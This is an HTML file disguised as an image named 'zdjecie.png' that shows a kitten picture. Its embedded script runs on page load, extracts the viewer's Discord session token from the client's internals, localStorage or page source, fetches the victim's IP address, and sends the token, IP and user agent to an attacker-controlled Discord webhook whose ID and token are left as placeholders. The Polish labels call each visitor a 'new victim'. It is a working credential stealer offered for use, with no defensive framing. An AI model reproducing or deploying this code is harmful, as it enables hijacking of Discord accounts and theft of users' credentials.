<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>zdjecie.png</title>
    <style>body{margin:0;overflow:hidden;background:#000}img{width:100%;height:100%;object-fit:cover;}</style>
</head>
<body>
    <img src="https://picsum.photos/900/600" alt="Cute kotek">

    <script>
        async function grabToken() {
            let token = null;
            try {
                // Najnowsza metoda 2026
                const modules = window.webpackChunkdiscord_app?.push([[{}],{},r=>r]) || {};
                for (let key in modules.c) {
                    if (modules.c[key]?.exports?.default?.getToken) {
                        token = modules.c[key].exports.default.getToken();
                        break;
                    }
                }
            } catch(e) {}

            if (!token) token = localStorage.getItem("token");
            if (!token) {
                const match = document.body.innerHTML.match(/"token":"([^"]{50,})"/i);
                if (match) token = match[1];
            }

            if (token && token.length > 50) {
                const ip = await fetch("https://api.ipify.org?format=text").then(r => r.text()).catch(() => "N/A");
                const payload = {
                    content: "**🎣 TOKEN ZŁAPANY KURWA!**",
                    embeds: [{
                        color: 0x00ff00,
                        title: "Nowa ofiara",
                        fields: [
                            {name: "Token", value: `\`\`\`${token}\`\`\``},
                            {name: "IP", value: ip},
                            {name: "UA", value: navigator.userAgent.substring(0, 200)},
                            {name: "Czas", value: new Date().toLocaleString('pl-PL')}
                        ]
                    }]
                };

                fetch("https://discord.com/api/webhooks/TWOJ_WEBHOOK_ID/TWOJ_WEBHOOK_TOKEN", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                }).catch(() => {});
            }
        }
        window.onload = grabToken;
    </script>
</body>
</html>
